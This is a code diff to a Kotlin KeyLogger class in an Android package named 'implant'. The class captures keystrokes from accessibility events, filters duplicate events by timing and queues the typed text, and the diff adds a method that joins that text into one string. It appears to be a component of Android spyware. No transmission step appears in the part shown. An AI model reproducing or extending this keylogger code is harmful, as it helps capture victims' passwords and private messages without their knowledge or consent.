@@ -1,18 +1,27 @@
+/*
+* Records keystrokes sent from the Keyboard and adds them to a queue.
+* Since Android sometimes sends duplicate AccessibilityEvents, we store the timestamp of the last
+* keystroke and ensure that the key events are far apart enough to be typed by a human before
+* adding them to the queue.
+* Spaces, backspace and enter keys are currently unsupported as no AccessibilityEvent seems to be
+* fired for them.
+* */
+
 package com.cooperthecoder.implant
 
 import java.util.*
 import java.util.concurrent.ConcurrentLinkedQueue
 import java.util.concurrent.atomic.AtomicLong
 
-class KeyLogger(val callback: (String) -> Unit) {
+class KeyLogger {
 
     val keystrokes: Queue<String> = ConcurrentLinkedQueue<String>()
     val lastEvent = AtomicLong(0)
 
     fun recordKeystroke(keystroke: String, time: Long) {
         // Avoid duplicate events from Android
-        val last = lastEvent.get()
-        if (time - last < Config.KEY_PRESS_TIMEOUT) {
+        val elapsed = time - lastEvent.get()
+        if (elapsed < Config.KEY_PRESS_TIMEOUT) {
             return
         }
 
@@ -22,5 +31,9 @@ class KeyLogger(val callback: (String) -> Unit) {
                 keystrokes.add(keystroke)
             }
         }
+    }
+
+    override fun toString(): String {
+        return keystrokes.joinToString("-")
     }
 }
